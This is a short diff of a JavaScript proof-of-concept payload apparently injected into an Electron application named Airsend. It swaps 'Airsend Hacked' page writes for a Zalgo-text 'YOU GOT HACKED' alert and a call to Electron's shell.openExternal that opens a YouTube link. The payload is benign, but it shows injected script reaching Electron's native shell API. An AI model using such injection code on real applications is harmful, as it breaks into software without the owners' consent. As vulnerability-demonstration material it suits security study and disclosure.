@@ -1,4 +1,7 @@
 console.log(this);
-alert("Code Injected!");
-this.document.write("<h1>Airsend Hacked</h1>");
-this.document.write("<h3>Proof of concept in progress...</h3>");
+alert("Code Injected! Ỷ̶̖̼̘̜̈́̓́Ǫ̸̛͕̖̈́̾̎̔͊͌͊͂̄̀̊̕͝͝U̷̘̟̪̫͉͑͌̌́͌̇̈́̉͆̌͠ ̸̩̹͆́̋̇͝G̴̛̻̤̲̣̎̉̋͌̐O̵̧̧̨̻͈͓͕̗̲̦̠͔͍̮͋͂̾̈́̕̚T̵̨̼̞̤̖̉͂ ̸̧̠̭̬̑̎̒̂͂̕̚̚͝Ḫ̸̛̎͌͛̏̌͒̔̆͗͐̽̔̕͠Ą̶̨̨̯̯̻̪͈̥̘̭̘͔̪͂́͜C̸̢̘̩̰͍͇̰̲̞̹̘͊̑̑̿̄͋̈́̔̅͌̕͜͜͝K̶̡̜̥̫̰͙͈̘̗̖̱̓̓̑̐̈́̂̿̀̀̈́͝͝È̵͜D̷̨̛̤̟͉̲̯̝̟͓̂̃̄̓̌̏̎̉͊̃́͐͗͝");
+
+
+const { shell } = require('electron')
+
+shell.openExternal('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
